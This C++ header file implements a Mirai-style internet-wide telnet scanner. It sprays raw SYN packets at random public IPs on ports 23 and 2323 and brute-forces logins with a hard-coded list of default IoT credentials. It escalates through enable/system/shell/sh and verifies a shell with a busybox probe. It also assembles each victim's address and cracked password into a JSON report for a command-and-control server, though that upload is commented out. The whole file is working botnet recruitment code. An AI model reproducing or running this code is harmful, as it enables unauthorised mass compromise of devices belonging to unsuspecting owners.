#ifndef SCANNER_HPP
#define SCANNER_HPP

#include <arpa/inet.h>
#include <errno.h>
#include <exception>
#include <fcntl.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "utils.hpp"
#include "net/request.hpp"
#include "../env.hpp"

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

struct net_address {
  uint32_t net_order_addr;
  std::string str_addr;
};

struct scanner_auth {
  char * username;
  char * password;
  uint16_t weight_min, weight_max;
  uint8_t username_len, password_len;
};

struct scanner_connection {
  struct scanner_auth * auth;
  int fd, last_recv;
  enum {
    SC_CLOSED,
    SC_CONNECTING,
    SC_HANDLE_IACS,
    SC_WAITING_USERNAME,
    SC_WAITING_PASSWORD,
    SC_WAITING_PASSWD_RESP,
    SC_WAITING_ENABLE_RESP,
    SC_WAITING_SYSTEM_RESP,
    SC_WAITING_SHELL_RESP,
    SC_WAITING_SH_RESP,
    SC_WAITING_TOKEN_RESP
  } state;
  uint32_t dst_addr;
  uint16_t dst_port;
  int rdbuf_pos;
  char rdbuf[SCANNER_RDBUF_SIZE];
  uint8_t tries;
};

static uint32_t x, y, z, w;

class Scanner {
  public:
    void ignite () {
      // Let the parent process continue running on the main thread.
      // scanner_pid = fork();
      // if (scanner_pid > 0 || scanner_pid == -1)
      //   return;

      LOCAL_ADDR = util_local_addr();

      rand_init();

      fake_time = time(NULL);

      int conn_index = 0;
      conn_table = (scanner_connection *) calloc(SCANNER_MAX_CONNS, sizeof(scanner_connection));
      
      for (; conn_index < SCANNER_MAX_CONNS; conn_index++) {
        conn_table[conn_index].state = scanner_connection::SC_CLOSED;
        conn_table[conn_index].fd = -1;
      }

      // Open a socket.
      int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
      if (raw_sock == -1) {
        #if defined(TALK)
        std::cout << "Scan failed. Cannot initialize raw socket." << std::endl;
        #endif
        exit(0);
      }

      conn_index = 1;
      fcntl(raw_sock, F_SETFL, O_NONBLOCK | fcntl(raw_sock, F_GETFL, 0));
      if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &conn_index, sizeof(conn_index)) != 0) {
        #if defined(TALK)
        std::cout << "Scan failed. Failed to set IP_HDRINCL." << std::endl;
        #endif
        close(raw_sock);
        exit(0);
      }

      uint16_t source_port;
      do {
        source_port = rand_next() & 0xffff;
      } while (ntohs(source_port) < 1024);

      struct iphdr * iph;
      struct tcphdr * tcph;
      char scanner_raw_packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
      iph = (struct iphdr *) scanner_raw_packet;
      tcph = (struct tcphdr *) (iph + 1);

      // Set up IP v4 headers.
      iph->ihl = 5;
      iph->version = 4;
      iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
      iph->id = rand_next();
      iph->ttl = 64;
      iph->protocol = IPPROTO_TCP;

      // Set up TCP headers.
      tcph->dest = htons(23);
      tcph->source = source_port;
      tcph->doff = 5;
      tcph->window = rand_next() & 0xffff;
      tcph->syn = 1;

      init_auth_entries();

      #if defined (TALK)
      std::cout << "Auth entries added. Scanner initialized." << std::endl;
      #endif

      while (true) {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection * conn;
        struct timeval tim;
        int last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
        net_address random_address = get_random_ip();

        // Spew out SYN to try and get a response.
        if (fake_time != last_spew) {
          last_spew = fake_time;

          for (conn_index = 0; conn_index < SCANNER_RAW_PPS; conn_index++) {
            struct sockaddr_in paddr = {0};
            struct iphdr * iph = (struct iphdr *) scanner_raw_packet;
            struct tcphdr * tcph = (struct tcphdr *) (iph + 1);

            iph->id = rand_next();
            iph->saddr = LOCAL_ADDR;
            iph->daddr = random_address.net_order_addr;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *) iph, sizeof(struct iphdr));

            tcph->dest = htons(conn_index % 10 == 0 ? 2323 : 23);
            tcph->seq = iph->daddr;
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

            paddr.sin_family = AF_INET;
            paddr.sin_addr.s_addr = iph->daddr;
            paddr.sin_port = tcph->dest;

            sendto(raw_sock, scanner_raw_packet, sizeof(scanner_raw_packet), MSG_NOSIGNAL, (struct sockaddr *) &paddr, sizeof(paddr));
          }
        }

        // Read packets from raw socket to get SYN + ACKs.
        int last_avail_conn = 0;
        while (true) {
          int n;
          char dgram[1514];
          struct iphdr * iph = (struct iphdr *)dgram;
          struct tcphdr * tcph = (struct tcphdr *)(iph + 1);
          struct scanner_connection * conn;

          errno = 0;
          n = recvfrom(raw_sock, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
          if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
            break;

          if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
            continue;
          if (iph->daddr != LOCAL_ADDR)
            continue;
          if (iph->protocol != IPPROTO_TCP)
            continue;
          if (tcph->source != htons(23) && tcph->source != htons(2323))
            continue;
          if (tcph->dest != source_port)
            continue;
          if (!tcph->syn)
            continue;
          if (!tcph->ack)
            continue;
          if (tcph->rst)
            continue;
          if (tcph->fin)
            continue;
          if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
            continue;

          conn = NULL;
          for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++) {
            if (conn_table[n].state == scanner_connection::SC_CLOSED) {
              conn = &conn_table[n];
              last_avail_conn = n;
              break;
            }
          }

          // Terminate the connection when no slots are available.
          if (conn == NULL)
            break;

          conn->dst_addr = iph->saddr;
          conn->dst_port = tcph->source;
          setup_connection(conn);
          #if defined (TALK)
          std::cout << "FD%d Attempting to brute a found IP.";
          #endif
        }

        // Load file descriptors into fdsets.
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for (conn_index = 0; conn_index < SCANNER_MAX_CONNS; conn_index++) {
          int timeout;

          conn = &conn_table[conn_index];
          timeout = (conn->state > scanner_connection::SC_CONNECTING ? 30 : 5);

          if (conn->state != scanner_connection::SC_CLOSED && (fake_time - conn->last_recv) > timeout) {
            #if defined (TALK)
            std::cout << "Connection timeout." << std::endl;
            #endif
            close(conn->fd);
            conn->fd = -1;

            // Retry.
            // If we were at least able to connect, try again.
            if (conn->state > scanner_connection::SC_HANDLE_IACS) {
              if (++(conn->tries) == 10) {
                conn->tries = 0;
                conn->state = scanner_connection::SC_CLOSED;
              } else {
                setup_connection(conn);
                #if defined(TALK)
                std::cout << "Trying different credentials." << std::endl;
                #endif
              }
            } else {
              conn->tries = 0;
              conn->state = scanner_connection::SC_CLOSED;
            }
            continue;
          }

          if (conn->state == scanner_connection::SC_CONNECTING) {
            FD_SET(conn->fd, &fdset_wr);
            if (conn->fd > mfd_wr)
              mfd_wr = conn->fd;
          } else if (conn->state != scanner_connection::SC_CLOSED) {
            FD_SET(conn->fd, &fdset_rd);
            if (conn->fd > mfd_rd)
              mfd_rd = conn->fd;
          }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (conn_index = 0; conn_index < SCANNER_MAX_CONNS; conn_index++) {
          conn = &conn_table[conn_index];

          if (conn->fd == -1)
            continue;

          if (FD_ISSET(conn->fd, &fdset_wr)) {
            int err = 0, ret = 0;
            socklen_t err_len = sizeof(err);

            ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
            if (err == 0 && ret == 0) {
              conn->state = scanner_connection::SC_HANDLE_IACS;
              conn->auth = random_auth_entry();
              conn->rdbuf_pos = 0;
              #if defined(TALK)
              printf("FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
              #endif
            } else {
              #if defined(TALK)
              printf("FD%d error while connecting = %d\n", conn->fd, err);
              #endif
              close(conn->fd);
              conn->fd = -1;
              conn->tries = 0;
              conn->state = scanner_connection::SC_CLOSED;
              continue;
            }
          }

          if (FD_ISSET(conn->fd, &fdset_rd)) {
            while (true) {
              int ret;

              if (conn->state == scanner_connection::SC_CLOSED)
                break;

              if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE) {
                memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
              }
              errno = 0;
              ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
              if (ret == 0) {
                #if defined(TALK)
                printf("FD%d connection gracefully closed\n", conn->fd);
                #endif
                errno = ECONNRESET;
                // Fall through to closing connection below.
                ret = -1;
              }
              if (ret == -1) {
                if (errno != EAGAIN && errno != EWOULDBLOCK) {
                  #if defined(TALK)
                  printf("FD%d lost connection\n", conn->fd);
                  #endif
                  close(conn->fd);
                  conn->fd = -1;

                  // Retry.
                  if (++(conn->tries) >= 10) {
                    conn->tries = 0;
                    conn->state = scanner_connection::SC_CLOSED;
                  } else {
                    setup_connection(conn);
                    #if defined(TALK)
                    printf("FD%d retrying with different auth combo!\n", conn->fd);
                    #endif
                  }
                }
                break;
              }
              conn->rdbuf_pos += ret;
              conn->last_recv = fake_time;

              while (true) {
                int consumed = 0;

                switch (conn->state) {
                case scanner_connection::SC_HANDLE_IACS:
                  if ((consumed = consume_iacs(conn)) > 0) {
                    conn->state = scanner_connection::SC_WAITING_USERNAME;
                    #if defined(TALK)
                    printf("FD%d finished telnet negotiation\n", conn->fd);
                    #endif
                  }
                  break;
                case scanner_connection::SC_WAITING_USERNAME:
                  if ((consumed = consume_user_prompt(conn)) > 0) {
                    send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                    conn->state = scanner_connection::SC_WAITING_PASSWORD;
                    #if defined(TALK)
                    printf("FD%d received username prompt\n", conn->fd);
                    #endif
                  }
                  break;
                case scanner_connection::SC_WAITING_PASSWORD:
                  if ((consumed = consume_pass_prompt(conn)) > 0) {
                    #if defined(TALK)
                    printf("FD%d received password prompt\n", conn->fd);
                    #endif

                    // Send password
                    send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                    conn->state = scanner_connection::SC_WAITING_PASSWD_RESP;
                  }
                  break;
                case scanner_connection::SC_WAITING_PASSWD_RESP:
                  if ((consumed = consume_any_prompt(conn)) > 0) {
                    char *tmp_str;
                    int tmp_len;

                    #if defined(TALK)
                    printf("FD%d received shell prompt\n", conn->fd);
                    #endif

                    // Send enable / system / shell / sh to session to drop into
                    // shell if needed.
                    tmp_str = (char *) O("enable");
                    send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                    conn->state = scanner_connection::SC_WAITING_ENABLE_RESP;
                  }
                  break;
                case scanner_connection::SC_WAITING_ENABLE_RESP:
                  if ((consumed = consume_any_prompt(conn)) > 0) {
                    char *tmp_str;
                    int tmp_len;

                    #if defined(TALK)
                    printf("FD%d received sh prompt\n", conn->fd);
                    #endif

                    tmp_str = (char *) O("system");
                    send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                    conn->state = scanner_connection::SC_WAITING_SYSTEM_RESP;
                  }
                  break;
                case scanner_connection::SC_WAITING_SYSTEM_RESP:
                  if ((consumed = consume_any_prompt(conn)) > 0) {
                    char *tmp_str;
                    int tmp_len;

                    #if defined(TALK)
                    printf("FD%d received sh prompt\n", conn->fd);
                    #endif

                    tmp_str = (char *) O("shell");
                    send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                    conn->state = scanner_connection::SC_WAITING_SHELL_RESP;
                  }
                  break;
                case scanner_connection::SC_WAITING_SHELL_RESP:
                  if ((consumed = consume_any_prompt(conn)) > 0) {
                    char *tmp_str;
                    int tmp_len;

                    #if defined(TALK)
                    printf("FD%d received enable prompt\n", conn->fd);
                    #endif

                    tmp_str = (char *) O("sh");
                    send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                    conn->state = scanner_connection::SC_WAITING_SH_RESP;
                  }
                  break;
                case scanner_connection::SC_WAITING_SH_RESP:
                  if ((consumed = consume_any_prompt(conn)) > 0) {
                    char * tmp_str;
                    int tmp_len;

                    #if defined(TALK)
                    printf("FD%d received sh prompt\n", conn->fd);
                    #endif

                    report_working(random_address.str_addr, conn->dst_port, conn->auth);

                    // Send query string
                    tmp_str = (char *) O("/bin/busybox ASDDDF");
                    send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                    conn->state = scanner_connection::SC_WAITING_TOKEN_RESP;
                  }
                  break;
                case scanner_connection::SC_WAITING_TOKEN_RESP:
                  consumed = consume_resp_prompt(conn);
                  if (consumed == -1) {
                    #if defined(TALK)
                    printf("FD%d invalid username/password combo\n", conn->fd);
                    #endif
                    close(conn->fd);
                    conn->fd = -1;

                    // Retry
                    if (++(conn->tries) == 10) {
                      conn->tries = 0;
                      conn->state = scanner_connection::SC_CLOSED;
                    } else {
                      setup_connection(conn);
                      #if defined(TALK)
                      printf("FD%d retrying with different auth combo!\n", conn->fd);
                      #endif
                    }
                  } else if (consumed > 0) {
                    char *tmp_str;
                    int tmp_len;
                    #if defined(TALK)
                    printf("FD%d Found verified working telnet\n", conn->fd);
                    #endif

                    report_working(random_address.str_addr, conn->dst_port, conn->auth);
                    
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = scanner_connection::SC_CLOSED;
                  }
                  break;
                default:
                  consumed = 0;
                  break;
                }

                // If no data was consumed, move on
                if (consumed == 0)
                  break;
                else {
                  if (consumed > conn->rdbuf_pos)
                    consumed = conn->rdbuf_pos;

                  conn->rdbuf_pos -= consumed;
                  memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                }
              }
            }
          }
        }
      }
    }

  private:
    int scanner_pid;
    uint32_t LOCAL_ADDR;
    uint32_t fake_time;
    struct scanner_connection * conn_table;
    struct scanner_auth * auth_table = NULL;
    uint16_t auth_table_max_weight;
    int auth_table_len;

    void init_auth_entries () {
      auth_table_max_weight = 0;
      auth_table_len = 0;

      add_auth_entry((char*) O("admin"), (char*) O("admin"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("nopassword"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("securepassword"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("default"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("pass"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("admin123"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("admin1234"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("admin12345"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("admin123456"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("admin1234567"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("admin12345678"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("admin123456789"), 1);
      add_auth_entry((char*) O("admin"), (char*) O(""), 1);
      add_auth_entry((char*) O("admin"), (char*) O("password"), 1);
      add_auth_entry((char*) O("admin"), (char*) O("administrator"), 1);
      add_auth_entry((char*) O("admin1"), (char*) O("admin"), 1);
      add_auth_entry((char*) O("administrator"), (char*) O("password"), 1);
      add_auth_entry((char*) O("administrator"), (char*) O("administrator"), 1);
      add_auth_entry((char*) O("administrator"), (char*) O("1234"), 1);
      add_auth_entry((char*) O("administrator"), (char*) O("12345"), 1);
      add_auth_entry((char*) O("administrator"), (char*) O("123456"), 1);
      add_auth_entry((char*) O("administrator"), (char*) O("1234567"), 1);
      add_auth_entry((char*) O("administrator"), (char*) O("12345678"), 1);
      add_auth_entry((char*) O("administrator"), (char*) O("123456789"), 1);
      add_auth_entry((char*) O("root"), (char*) O("toor"), 1);
      add_auth_entry((char*) O("root"), (char*) O("realtek"), 1);
      add_auth_entry((char*) O("root"), (char*) O("password123"), 1);
      add_auth_entry((char*) O("root"), (char*) O("password"), 1);
      add_auth_entry((char*) O("service"), (char*) O("service"), 1);
      add_auth_entry((char*) O("security"), (char*) O("security"), 1);
      add_auth_entry((char*) O("guest"), (char*) O("guest"), 1);
      add_auth_entry((char*) O("user"), (char*) O("pass"), 1);
      add_auth_entry((char*) O("system"), (char*) O("system"), 1);
      add_auth_entry((char*) O("supervisor"), (char*) O("supervisor"), 1);
      add_auth_entry((char*) O("supervisor"), (char*) O(""), 1);
      add_auth_entry((char*) O("superuser"), (char*) O("superuser"), 1);
      add_auth_entry((char*) O("superuser"), (char*) O(""), 1);
      add_auth_entry((char*) O("cisco"), (char*) O("cisco"), 1);
      add_auth_entry((char*) O("telekom"), (char*) O("telekom"), 1);
      add_auth_entry((char*) O("telekom"), (char*) O(""), 1);
      add_auth_entry((char*) O("telekom"), (char*) O("admin"), 1);
      add_auth_entry((char*) O("telekom"), (char*) O("1234"), 1);
      add_auth_entry((char*) O("telekom"), (char*) O("12345"), 1);
      add_auth_entry((char*) O("telekom"), (char*) O("123456"), 1);
      add_auth_entry((char*) O("telekom"), (char*) O("1234567"), 1);
      add_auth_entry((char*) O("telekom"), (char*) O("12345678"), 1);
      add_auth_entry((char*) O("telekom"), (char*) O("123456789"), 1);
      add_auth_entry((char*) O("username"), (char*) O("password"), 1);
    }

    void rand_init () {
      x = time(NULL);
      y = getpid() ^ getppid();
      z = clock();
      w = z ^ y;
    }

    uint32_t rand_next () {
      uint32_t t = x;
      t ^= t << 11;
      t ^= t >> 8;
      x = y;
      y = z;
      z = w;
      w ^= w >> 19;
      w ^= t;
      return w;
    }

    /* Valid credentials found. */
    void report_working (std::string address, uint16_t port, struct scanner_auth * auth) {
      #if defined(TALK)
      std::cout << "Telnet credentials found -> " << address << ":" << port << " -> " << auth->username << " | " << auth->password << std::endl;
      #endif

      std::string payload = "";
      payload += O("{\"address\":\"");
      payload += address;
      payload += O("\",\"port\":\"");
      payload += std::to_string(port);
      payload += O("\",\"details\":{");
      payload += O("\"telnetUsername\":\"");
      payload += auth->username;
      payload += O("\",\"telnetPassword\":\"");
      payload += auth->password;
      payload += O("\"}");
      payload += O("}");

      /*
      Request req {
        DOMENA_HOST,
        DOMENA_PORT,
        O("/v1/services"),
        DOMENA_SSL,
        O("POST"),
        payload,
      };

      try {
        req.exec();
      }
      catch (const std::exception &e) {
        #if defined(TALK)
        std::cout << "Failed to report found credentials." << std::endl; 
        std::cout << e.what() << std::endl; 
        #endif
      }
      */
    }

    int consume_resp_prompt (struct scanner_connection * conn) {
      char * tkn_resp;
      int prompt_ending, len;

      tkn_resp = (char *) O("ncorrect");
      if (Utils().memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
        return -1;

      tkn_resp = (char *) O("XENA: applet not found");
      prompt_ending = Utils().memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);

      if (prompt_ending == -1)
        return 0;
      else
        return prompt_ending;
    }

    char can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount) {
      uint8_t * end = (uint8_t *) (conn->rdbuf + conn->rdbuf_pos);
      return ptr + amount < end;
    }

    int consume_iacs (struct scanner_connection * conn) {
      uint8_t * ptr = (uint8_t *) conn->rdbuf;

      int consumed = 0;
      while (consumed < conn->rdbuf_pos) {
        int i;

        if (*ptr != 0xff)
          break;
        else if (*ptr == 0xff) {
          if (!can_consume(conn, ptr, 1))
            break;
          if (ptr[1] == 0xff) {
            ptr += 2;
            consumed += 2;
            continue;
          } else if (ptr[1] == 0xfd) {
            uint8_t tmp1[3] = {255, 251, 31};
            uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

            if (!can_consume(conn, ptr, 2))
              break;
            if (ptr[2] != 31)
              goto iac_wont;

            ptr += 3;
            consumed += 3;

            send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
            send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
          } else {
          iac_wont:

            if (!can_consume(conn, ptr, 2))
              break;

            for (i = 0; i < 3; i++) {
              if (ptr[i] == 0xfd)
                ptr[i] = 0xfc;
              else if (ptr[i] == 0xfb)
                ptr[i] = 0xfd;
            }

            send(conn->fd, ptr, 3, MSG_NOSIGNAL);
            ptr += 3;
            consumed += 3;
          }
        }
      }

      return consumed;
    }

    int consume_any_prompt (struct scanner_connection * conn) {
      char * pch;
      int prompt_ending = -1;

      for (int i = conn->rdbuf_pos - 1; i > 0; i--) {
        if (
          conn->rdbuf[i] == ':'
          || conn->rdbuf[i] == '>'
          || conn->rdbuf[i] == '$'
          || conn->rdbuf[i] == '#'
          || conn->rdbuf[i] == '%'
        ) {
          prompt_ending = i + 1;
          break;
        }
      }

      if (prompt_ending == -1)
        return 0;
      else
        return prompt_ending;
    }

    int consume_pass_prompt (struct scanner_connection * conn) {
      char * pch;
      int i, prompt_ending = -1;

      for (i = conn->rdbuf_pos - 1; i > 0; i--) {
        if (
          conn->rdbuf[i] == ':'
          || conn->rdbuf[i] == '>'
          || conn->rdbuf[i] == '$'
          || conn->rdbuf[i] == '#'
        ) {
          prompt_ending = i + 1;
          break;
        }
      }

      if (prompt_ending == -1) {
        int tmp;

        if ((tmp = Utils().memsearch(conn->rdbuf, conn->rdbuf_pos, (char *) "assword", 7)) != -1)
          prompt_ending = tmp;
      }

      if (prompt_ending == -1)
        return 0;
      else
        return prompt_ending;
    }

    int consume_user_prompt (struct scanner_connection * conn) {
      char * pch;
      int i, prompt_ending = -1;

      for (i = conn->rdbuf_pos - 1; i > 0; i--) {
        if (
          conn->rdbuf[i] == ':'
          || conn->rdbuf[i] == '>'
          || conn->rdbuf[i] == '$'
          || conn->rdbuf[i] == '#'
          || conn->rdbuf[i] == '%'
        ) {
          prompt_ending = i + 1;
          break;
        }
      }

      if (prompt_ending == -1) {
        int tmp;

        if ((tmp = Utils().memsearch(conn->rdbuf, conn->rdbuf_pos, (char *) "ogin", 4)) != -1)
          prompt_ending = tmp;
        else if ((tmp = Utils().memsearch(conn->rdbuf, conn->rdbuf_pos, (char *) "enter", 5)) != -1)
          prompt_ending = tmp;
      }

      if (prompt_ending == -1)
        return 0;
      else
        return prompt_ending;
    }

    void setup_connection (struct scanner_connection * conn) {
      if (conn->fd != -1)
        close(conn->fd);
      
      if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        #if defined (TALK)
        std::cout << "Scanner failed to open a socket." << std::endl;
        #endif
        return;
      }

      conn->rdbuf_pos = 0;
      Utils().zero(conn->rdbuf, sizeof(conn->rdbuf));

      fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

      struct sockaddr_in addr = {0};
      addr.sin_family = AF_INET;
      addr.sin_addr.s_addr = conn->dst_addr;
      addr.sin_port = conn->dst_port;

      conn->last_recv = fake_time;
      conn->state = scanner_connection::SC_CONNECTING;
      connect(conn->fd, (struct sockaddr *) &addr, sizeof(struct sockaddr_in));
    }

    uint16_t checksum_tcpudp (struct iphdr * iph, void * buff, uint16_t data_len, int len) {
      const uint16_t * buf = (uint16_t *) buff;
      uint32_t ip_src = iph->saddr;
      uint32_t ip_dst = iph->daddr;
      uint32_t sum = 0;
      int length = len;
      
      while (len > 1) {
        sum += *buf;
        buf++;
        len -= 2;
      }

      if (len == 1)
        sum += *((uint8_t *) buf);

      sum += (ip_src >> 16) & 0xFFFF;
      sum += ip_src & 0xFFFF;
      sum += (ip_dst >> 16) & 0xFFFF;
      sum += ip_dst & 0xFFFF;
      sum += htons(iph->protocol);
      sum += data_len;

      while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

      return ((uint16_t) (~sum));
    }

    uint16_t checksum_generic (uint16_t * addr, uint32_t count) {
      register unsigned long sum = 0;

      for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
      if (count == 1)
        sum += (char) * addr;

      sum = (sum >> 16) + (sum & 0xFFFF);
      sum += (sum >> 16);
      
      return ~sum;
    }

    int recv_strip_null (int sock, void * buf, int len, int flags) {
      int ret = recv(sock, buf, len, flags);
      if (ret > 0)
        for (int i = 0; i < ret; i++)
          if (((char *) buf)[i] == 0x00)
            ((char *) buf)[i] = 'A';
      return ret;
    }

    net_address get_random_ip () {
      uint32_t tmp;
      uint8_t o1, o2, o3, o4;

      do {
        tmp = rand_next();
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
      }
      while (
        // 127.0.0.0/8 - Loopback.
        o1 == 127
        // 0.0.0.0/8 - Invalid address space.
        || (o1 == 0)
        // 10.0.0.0/8 - Internal network.
        || (o1 == 10)
        // 192.168.0.0/16 - Internal network.
        || (o1 == 192 && o2 == 168)
        // 172.16.0.0/14 - Internal network.
        || (o1 == 172 && o2 >= 16 && o2 < 32)
        // 100.64.0.0/10 - IANA NAT reserved.
        || (o1 == 100 && o2 >= 64 && o2 < 127)
        // 169.254.0.0/16 - IANA NAT reserved.
        || (o1 == 169 && o2 > 254)
        // 198.18.0.0/15 - IANA Special use.
        || (o1 == 198 && o2 >= 18 && o2 < 20)
        // 224.*.*.* - Multicast.
        || (o1 >= 224)
      );

      net_address n;
      n.net_order_addr = INET_ADDR(o1, o2, o3, o4);
      n.str_addr = std::to_string(o1) + "." + std::to_string(o2) + "." + std::to_string(o3) + "." + std::to_string(o4);
      return n;
    }

    void add_auth_entry (char * user, char * pass, uint16_t weight) {
      auth_table = (scanner_auth *) realloc(auth_table, (auth_table_len + 1) * sizeof(struct scanner_auth));
      auth_table[auth_table_len].username = user;
      auth_table[auth_table_len].username_len = (uint8_t) Utils().strlen(user);
      auth_table[auth_table_len].password = pass;
      auth_table[auth_table_len].password_len = (uint8_t) Utils().strlen(pass);
      auth_table[auth_table_len].weight_min = auth_table_max_weight;
      auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
      auth_table_max_weight += weight;
    }

    struct scanner_auth * random_auth_entry () {
      uint16_t r = (uint16_t) (rand_next() % auth_table_max_weight);
      for (int i = 0; i < auth_table_len; i++) {
        if (r < auth_table[i].weight_min)
          continue;
        else if (r < auth_table[i].weight_max)
          return &auth_table[i];
      }
      return NULL;
    }

    uint32_t util_local_addr () {
      struct sockaddr_in addr;
      socklen_t addr_len = sizeof (addr);
      errno = 0;

      int fd;
      if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        #if defined(TALK)
        std::cout << "Failed to call socket() errno: " << errno << std::endl;
        #endif
        return 0;
      }

      addr.sin_family = AF_INET;
      addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
      addr.sin_port = htons(53);

      if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1) {
        #if defined(TALK)
        std::cout << "Connection failed whilte getting the local IP address." << std::endl;
        #endif
      }

      getsockname(fd, (struct sockaddr *)&addr, &addr_len);
      close(fd);

      return addr.sin_addr.s_addr;
  }
};

#endif // SCANNER_HPP